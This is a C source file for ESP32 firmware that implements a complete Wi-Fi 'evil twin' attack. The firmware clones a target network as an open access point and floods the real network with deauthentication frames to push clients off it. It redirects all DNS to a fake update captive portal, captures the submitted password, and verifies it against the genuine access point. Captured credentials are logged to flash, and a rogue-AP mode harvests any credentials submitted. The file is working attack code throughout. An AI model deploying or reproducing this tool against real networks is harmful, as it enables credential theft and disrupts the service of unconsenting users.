/**
 * @file attack_eviltwin.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 * @brief Captures WiFi passwords via fake update page with DNS redirection and deauth.
 */

#include "attack_method.h"
#include "attack.h"
#include "esp_wifi.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "lwip/dns.h"
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <sys/param.h>

#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "webserver.h"
#include "esp_netif.h"
#include "management_helper.h"
#include "hydra_ssd1306_display.h"
#include "wifi_pass_verifier.h"

static const char *TAG = "main:evil_twin";

#define EVILTWIN_LOG_PATH "/spiffs/eviltwin_log.txt"


typedef struct __attribute__((packed)) {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header_t;


static TaskHandle_t evil_twin_task_handle = NULL;
static TaskHandle_t dns_task_handle = NULL;
static httpd_handle_t evil_server = NULL;
static int dns_socket = -1;
static bool evil_twin_active = false;
static char evil_twin_password[65] = {0};
static char evil_twin_username[65] = {0};
static bool password_captured = false;
static bool password_verified = false;
static wifi_ap_record_t evil_twin_target;

/* Custom-name (rogue AP) mode: broadcasts an operator-chosen SSID that does not
 * imitate any real network. There is no real AP to deauth and no way to verify a
 * captured password, so this mode simply keeps the captive portal up and appends
 * every submitted credential to the persistent log until the operator stops it. */
static bool custom_mode = false;
static volatile bool evil_twin_stop_requested = false;


static void dns_server_task(void *pvParameters);
static void start_captive_portal(void);
static void stop_captive_portal(void);
static esp_err_t captive_handler(httpd_req_t *req);
static esp_err_t password_handler(httpd_req_t *req);
static esp_err_t wrong_password_handler(httpd_req_t *req);
static esp_err_t admin_stop_handler(httpd_req_t *req);
static void reset_wifi_to_apsta(const wifi_ap_record_t *target);
static void eviltwin_log_write(const wifi_ap_record_t *target, const char *username,
                               const char *password, const char *status);

static int wrong_attempt_count = 0;
static char wrong_passwords_log[512] = {0};
static char evil_twin_captured_password[65] = {0};



static void reset_wifi_to_apsta(const wifi_ap_record_t *target) {
    esp_wifi_disconnect();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));

    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, target->ssid, 32);
    ap_config.ap.ssid_len = strlen((char *)target->ssid);
    ap_config.ap.channel = target->primary;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    wifi_config_t sta_config = {0};
    sta_config.sta.channel = target->primary;
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);

    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    esp_wifi_set_channel(target->primary, WIFI_SECOND_CHAN_NONE);
    ESP_LOGI(TAG, "WiFi reset to APSTA on channel %d", target->primary);
}



static void evil_twin_task(void *pvArg) {
    ESP_LOGI(TAG, "Devil Twin [BIT AGGRESIVE ;)]");


    wifi_verify_init();

    wifi_ap_record_t *target = &evil_twin_target;
    webserver_stop();
    vTaskDelay(pdMS_TO_TICKS(500));

    while (!password_verified && !evil_twin_stop_requested) {
        ESP_LOGI(TAG, "Starting new cycle...");


        reset_wifi_to_apsta(target);
        start_captive_portal();

        /* Custom rogue AP: no real network to imitate → no deauth and no password
         * verification. Keep the AP + captive portal up (no rebuild) and append every
         * submitted credential to the persistent log until the operator stops us. */
        if (custom_mode) {
            ESP_LOGI(TAG, "Rogue AP '%s' up. Capturing until stopped...", (char *)target->ssid);
            oled_log(OLED_HEAD, 8, "Rogue AP up");
            while (!evil_twin_stop_requested) {
                vTaskDelay(pdMS_TO_TICKS(200));
                if (password_captured) {
                    ESP_LOGI(TAG, "Rogue capture — user:'%s' pass:'%s'", evil_twin_username, evil_twin_password);
                    oled_log(OLED_LINE1, 8, "Captured!");
                    eviltwin_log_write(target, evil_twin_username, evil_twin_password, "CAPTURED");
                    password_captured = false;
                    memset(evil_twin_password, 0, sizeof(evil_twin_password));
                    memset(evil_twin_username, 0, sizeof(evil_twin_username));
                }
            }
            goto cleanup;
        }

        bool victim_connected = false;
        uint32_t wait_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
        password_captured = false;

        ESP_LOGI(TAG, "Deauth active. Waiting for victim...");


        while (!victim_connected && !password_captured) {
            wsl_bypasser_send_deauth_frame(target);
            vTaskDelay(pdMS_TO_TICKS(40));

            wifi_sta_list_t sta_list;
            if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num > 0) {
                ESP_LOGI(TAG, "Victim joined fake AP! Pausing deauth.");
                victim_connected = true;
                break;
            }
            if ((xTaskGetTickCount() * portTICK_PERIOD_MS) - wait_start > 300000) {
                goto cleanup;
            }
        }


        while (victim_connected && !password_captured) {
            vTaskDelay(pdMS_TO_TICKS(500));
            wifi_sta_list_t sta_list;
            if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num == 0) {
                victim_connected = false;
                break;
            }
        }


        if (password_captured && !password_verified) {
            ESP_LOGI(TAG, "Testing password : '%s'", evil_twin_password);
            oled_log(OLED_LINE1, 7, "Testing...");

            stop_captive_portal();
            vTaskDelay(pdMS_TO_TICKS(500));


            wifi_verify_result_t result = wifi_verify_password(
                (const char *)target->ssid,
             evil_twin_password,
             target->bssid,
            15000
            );

            if (result.status == WIFI_VERIFY_CORRECT) {
                password_verified = true;
                strncpy(evil_twin_captured_password, evil_twin_password, 64);
                evil_twin_captured_password[63] = '\0';

                ESP_LOGI(TAG, "PASS: %s | IP: " IPSTR, evil_twin_password, IP2STR(&result.ip));
                oled_log(OLED_HEAD, 8, "Pass Captured!");
                oled_log(OLED_LINE1, 8, "%s", evil_twin_password);
                eviltwin_log_write(target, evil_twin_username, evil_twin_password, "SUCCESS");
                attack_update_status(FINISHED);
            }
            else if (result.status == WIFI_VERIFY_WRONG_PASSWORD) {
                wrong_attempt_count++;
                ESP_LOGW(TAG, "WRONG PASSWORD (Reason: %d)", result.disconnect_reason);
                eviltwin_log_write(target, evil_twin_username, evil_twin_password, "WRONG");

                char log_entry[96];
                snprintf(log_entry, sizeof(log_entry), "[#%d] %s | ", wrong_attempt_count, evil_twin_password);
                if (strlen(wrong_passwords_log) + strlen(log_entry) < sizeof(wrong_passwords_log)) {
                    strcat(wrong_passwords_log, log_entry);
                }

                password_captured = false;
                memset(evil_twin_password, 0, sizeof(evil_twin_password));
                oled_log(OLED_LINE1, 7, "Wrong password!");
                vTaskDelay(pdMS_TO_TICKS(1500));
            }
            else {

                ESP_LOGW(TAG, "Verification Incomplete: %s", wifi_verify_status_str(result.status));
                oled_log(OLED_LINE1, 7, "Range issue/Timeout");

                password_captured = false;
                vTaskDelay(pdMS_TO_TICKS(1500));
            }
        }
    }

    cleanup:
    stop_captive_portal();
    /* Restore the management AP whenever it was captured (normal mode) or whenever
     * the operator stopped a rogue AP (custom mode) — otherwise the device would be
     * left stranded broadcasting the fake SSID with no way back to the web UI. */
    if (password_verified || custom_mode) {
        restore_management_system();
    }
    custom_mode = false;
    evil_twin_stop_requested = false;
    evil_twin_active = false;
    evil_twin_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_method_evil_twin(const wifi_ap_record_t *ap_record) {
    if (evil_twin_active) return;
    memcpy(&evil_twin_target, ap_record, sizeof(wifi_ap_record_t));
    custom_mode = false;
    evil_twin_stop_requested = false;
    evil_twin_active = true;
    password_captured = false;
    password_verified = false;
    memset(evil_twin_password, 0, sizeof(evil_twin_password));
    memset(evil_twin_username, 0, sizeof(evil_twin_username));
    xTaskCreate(evil_twin_task, "evil_twin_task", 10240, NULL, 5, &evil_twin_task_handle);
}

/**
 * @brief Starts an Evil Twin using an operator-chosen SSID that does not imitate any
 *        existing network (rogue AP). No deauth and no password verification are
 *        performed; every credential submitted through the captive portal is appended
 *        to the persistent log and the AP stays up until attack_method_evil_twin_custom_stop().
 */
void attack_method_evil_twin_custom(const char *ssid) {
    if (evil_twin_active) return;
    if (ssid == NULL || ssid[0] == '\0') return;

    memset(&evil_twin_target, 0, sizeof(evil_twin_target));
    strncpy((char *)evil_twin_target.ssid, ssid, sizeof(evil_twin_target.ssid) - 1);
    evil_twin_target.primary = 1;   /* fixed channel for the rogue AP */

    custom_mode = true;
    evil_twin_stop_requested = false;
    evil_twin_active = true;
    password_captured = false;
    password_verified = false;
    memset(evil_twin_password, 0, sizeof(evil_twin_password));
    memset(evil_twin_username, 0, sizeof(evil_twin_username));
    xTaskCreate(evil_twin_task, "evil_twin_task", 10240, NULL, 5, &evil_twin_task_handle);
}


bool is_evil_twin_active(void) {
    return evil_twin_active;
}

void attack_method_evil_twin_stop(void) {
    restore_management_system();
}

void attack_method_evil_twin_custom_stop(void) {
    evil_twin_stop_requested = true;
}

const char* get_evil_twin_password(void) {
    if (password_verified && evil_twin_captured_password[0] != '\0') {
        return evil_twin_captured_password;
    }
    return NULL;
}

int get_wrong_attempts_count(void) {
    return wrong_attempt_count;
}

void get_wrong_passwords(char *buffer, size_t max_len) {
    if (buffer && max_len > 0) {
        strncpy(buffer, wrong_passwords_log, max_len - 1);
        buffer[max_len - 1] = '\0';
    }
}

/** Replaces '|', '\r' and '\n' with a space so a single log entry can't break the line format. */
static void eviltwin_log_sanitize(char *dst, size_t dst_len, const char *src) {
    size_t n = 0;
    for (; src[n] && n < dst_len - 1; n++) {
        char c = src[n];
        dst[n] = (c == '|' || c == '\r' || c == '\n') ? ' ' : c;
    }
    dst[n] = '\0';
}

/**
 * @brief Appends one captured captive-portal credential to a persistent SPIFFS log.
 *        Survives reboots/power loss, needs no internet connection.
 *        Line format: <uptime_ms>|<ssid>|<bssid>|<username>|<password>|<status>
 */
static void eviltwin_log_write(const wifi_ap_record_t *target, const char *username,
                               const char *password, const char *status) {
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             target->bssid[0], target->bssid[1], target->bssid[2],
             target->bssid[3], target->bssid[4], target->bssid[5]);

    char ssid_safe[33], user_safe[65], pass_safe[65];
    eviltwin_log_sanitize(ssid_safe, sizeof(ssid_safe), (const char *)target->ssid);
    eviltwin_log_sanitize(user_safe, sizeof(user_safe), username ? username : "");
    eviltwin_log_sanitize(pass_safe, sizeof(pass_safe), password ? password : "");

    FILE *f = fopen(EVILTWIN_LOG_PATH, "a");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open %s for logging", EVILTWIN_LOG_PATH);
        return;
    }
    fprintf(f, "%llu|%s|%s|%s|%s|%s\n",
            (unsigned long long)(esp_timer_get_time() / 1000ULL),
            ssid_safe, bssid_str, user_safe, pass_safe, status);
    fclose(f);
}

static void dns_server_task(void *pvParameters) {
    uint8_t buffer[512];
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(53);

    bind(dns_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    ESP_LOGI(TAG, "DNS Server Active");

    while (evil_twin_active) {
        int len = recvfrom(dns_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&client_addr, &addr_len);
        if (len < 12) continue;

        dns_header_t *dns_header = (dns_header_t *)buffer;
        dns_header->flags = htons(0x8180);
        dns_header->ancount = dns_header->qdcount;

        uint8_t *ptr = buffer + len;
        *ptr++ = 0xc0; *ptr++ = 0x0c;
        *ptr++ = 0x00; *ptr++ = 0x01;
        *ptr++ = 0x00; *ptr++ = 0x01;
        *ptr++ = 0x00; *ptr++ = 0x00; *ptr++ = 0x00; *ptr++ = 0x3c;
        *ptr++ = 0x00; *ptr++ = 0x04;
        *ptr++ = 192; *ptr++ = 168; *ptr++ = 4; *ptr++ = 1;

        sendto(dns_socket, buffer, ptr - buffer, 0, (struct sockaddr *)&client_addr, addr_len);
    }
    vTaskDelete(NULL);
}

static esp_err_t captive_handler(httpd_req_t *req) {
    ESP_LOGI(TAG, "Serving captive portal to %s", req->uri);

    char* html = load_html_from_spiffs("/spiffs/devil_twin/index.html");

    if (html == NULL) {
        ESP_LOGE(TAG, "Failed to load index.html from SPIFFS!");
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Configuration Error");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    free(html);

    return ESP_OK;
}

static esp_err_t wrong_password_handler(httpd_req_t *req) {

    char* html = load_html_from_spiffs("/spiffs/devil_twin/wrong-password.html");

    if (html == NULL) {
        ESP_LOGE(TAG, "Failed to load wrong-password.html from SPIFFS!");
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Configuration Error");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    free(html);

    return ESP_OK;
}

/** Hex digit -> value, or -1 if not a hex digit. */
static int hex_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/**
 * @brief Extracts one x-www-form-urlencoded field into dst (url-decoded).
 * @return true if the key was present. dst is always NUL-terminated.
 */
static bool form_field_decode(const char *body, const char *key, char *dst, size_t dst_size) {
    dst[0] = '\0';
    size_t key_len = strlen(key);
    const char *p = body;
    /* Find "key=" at the start of the body or right after an '&'. */
    while ((p = strstr(p, key)) != NULL) {
        bool at_boundary = (p == body) || (p[-1] == '&');
        if (at_boundary && p[key_len] == '=') { p += key_len + 1; break; }
        p += 1;
    }
    if (p == NULL) return false;

    size_t idx = 0;
    for (size_t i = 0; p[i] && p[i] != '&' && idx < dst_size - 1; i++) {
        char c = p[i];
        if (c == '+') {
            dst[idx++] = ' ';
        } else if (c == '%' && hex_val(p[i+1]) >= 0 && hex_val(p[i+2]) >= 0) {
            dst[idx++] = (char)((hex_val(p[i+1]) << 4) | hex_val(p[i+2]));
            i += 2;
        } else {
            dst[idx++] = c;
        }
    }
    dst[idx] = '\0';
    return true;
}

static esp_err_t password_handler(httpd_req_t *req) {
    if (password_captured) {
        httpd_resp_set_type(req, "text/plain");
        httpd_resp_send(req, "ALREADY_CHECKING", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    char buf[512];
    int ret = httpd_req_recv(req, buf, MIN(req->content_len, sizeof(buf)-1));
    if (ret <= 0) {
        ESP_LOGE(TAG, "Failed to receive POST data");
        return ESP_FAIL;
    }
    buf[ret] = '\0';

    ESP_LOGD(TAG, "Received raw POST data: %s", buf);

    /* username is optional (the classic clone portal only asks for a password). */
    form_field_decode(buf, "username", evil_twin_username, sizeof(evil_twin_username));

    if (form_field_decode(buf, "password", evil_twin_password, sizeof(evil_twin_password))) {
        password_captured = true;

        ESP_LOGI(TAG, "Captured credential — user:'%s' pass:'%s'",
                 evil_twin_username, evil_twin_password);

        httpd_resp_set_type(req, "text/plain");
        httpd_resp_send(req, "OK", 2);
    } else {
        ESP_LOGW(TAG, "Password field not found in payload");
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing password field");
    }
    return ESP_OK;
}

/**
 * @brief Admin control route served on the rogue AP itself. Because the management
 *        AP is offline while the rogue AP is broadcasting, the operator stops a
 *        custom (continuous) Evil Twin by connecting to the rogue Wi-Fi and opening
 *        http://192.168.4.1/crx3-admin-stop.
 */
static esp_err_t admin_stop_handler(httpd_req_t *req) {
    evil_twin_stop_requested = true;
    httpd_resp_set_type(req, "text/html");
    const char *page =
        "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Stopped</title></head><body style='font-family:sans-serif;text-align:center;padding:40px'>"
        "<h2>Rogue AP stopped</h2><p>The device is returning to management mode. "
        "Reconnect to the management Wi-Fi to review captured credentials.</p></body></html>";
    return httpd_resp_send(req, page, HTTPD_RESP_USE_STRLEN);
}

static void start_captive_portal(void) {
    if (evil_server != NULL) {
        httpd_stop(evil_server);
        evil_server = NULL;
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 18;
    config.stack_size = 8192;
    config.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&evil_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start HTTP server!");
        return;
    }

    const char* android_urls[] = {
        "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt",
        "/fwlink/", "/redirect", "/hotspot-detect.html", "/library/test/success.html", NULL
    };

    for (int i = 0; android_urls[i]; i++) {
        httpd_uri_t uri = { .uri = android_urls[i], .method = HTTP_GET, .handler = captive_handler };
        httpd_register_uri_handler(evil_server, &uri);
    }

    const char* apple_urls[] = {
        "/hotspot-detect.html", "/library/test/success.html", "/apple-captive", NULL
    };

    for (int i = 0; apple_urls[i]; i++) {
        httpd_uri_t uri = { .uri = apple_urls[i], .method = HTTP_GET, .handler = captive_handler };
        httpd_register_uri_handler(evil_server, &uri);
    }

    httpd_uri_t msft = {.uri = "/msftconnecttest.com", .method = HTTP_GET, .handler = captive_handler};
    httpd_register_uri_handler(evil_server, &msft);

    httpd_uri_t root = {.uri = "/", .method = HTTP_GET, .handler = captive_handler};
    httpd_register_uri_handler(evil_server, &root);

    httpd_uri_t submit = {.uri = "/submit", .method = HTTP_POST, .handler = password_handler};
    httpd_register_uri_handler(evil_server, &submit);

    httpd_uri_t wrong_uri = {
        .uri = "/wrong-password",
        .method = HTTP_GET,
        .handler = wrong_password_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(evil_server, &wrong_uri);

    /* Operator control route — must be registered before the catch-all so it is not
     * swallowed by the captive portal. Used to stop a continuous rogue AP. */
    httpd_uri_t admin_stop = {.uri = "/crx3-admin-stop", .method = HTTP_GET, .handler = admin_stop_handler};
    httpd_register_uri_handler(evil_server, &admin_stop);

    httpd_uri_t catchall = {.uri = "/*", .method = HTTP_GET, .handler = captive_handler};
    httpd_register_uri_handler(evil_server, &catchall);

    if (dns_task_handle == NULL) {
        xTaskCreate(dns_server_task, "dns_task", 4096, NULL, 5, &dns_task_handle);
    }
    ESP_LOGI(TAG, "Captive Portal Ready on port 80");
}

static void stop_captive_portal(void) {
    if (dns_task_handle) {
        vTaskDelete(dns_task_handle);
        dns_task_handle = NULL;
    }
    if (evil_server) {
        httpd_stop(evil_server);
        evil_server = NULL;
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    if (dns_socket != -1) {
        close(dns_socket);
        dns_socket = -1;
    }
}
